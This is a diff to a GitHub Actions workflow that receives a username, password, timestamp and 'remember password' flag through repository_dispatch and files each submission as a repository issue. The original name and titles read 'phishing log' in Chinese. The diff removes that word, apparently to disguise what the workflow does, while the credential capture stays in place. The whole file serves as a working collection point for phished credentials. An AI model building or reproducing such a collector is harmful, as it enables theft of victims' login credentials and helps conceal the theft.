@@ -2,8 +2,11 @@ permissions:
   issues: write
   contents: write
 
-name: 钓鱼日志记录
-on: [repository_dispatch]
+name: 日志记录
+on:
+  repository_dispatch:
+    types: [log_event]  
+
 jobs:
   log:
     runs-on: ubuntu-latest
@@ -13,10 +16,10 @@ jobs:
         uses: actions/github-script@v6
         with:
           script: |
-            const data = context.payload.client_payload;
+            const data = context.payload.client_payload;  
             github.rest.issues.create({
               owner: context.repo.owner,
               repo: context.repo.repo,
-              title: '钓鱼日志: 用户 ' + data.user,
-              body: '时间: ' + data.ts + '\\n用户名: ' + data.user + '\\n密码: ' + data.pass + '\\n记住密码: ' + data.remember
+              title: '日志: 用户 ' + data.user,
+              body: `时间: ${data.ts}\n用户名: ${data.user}\n密码: ${data.pass}\n记住密码: ${data.remember}`
             });
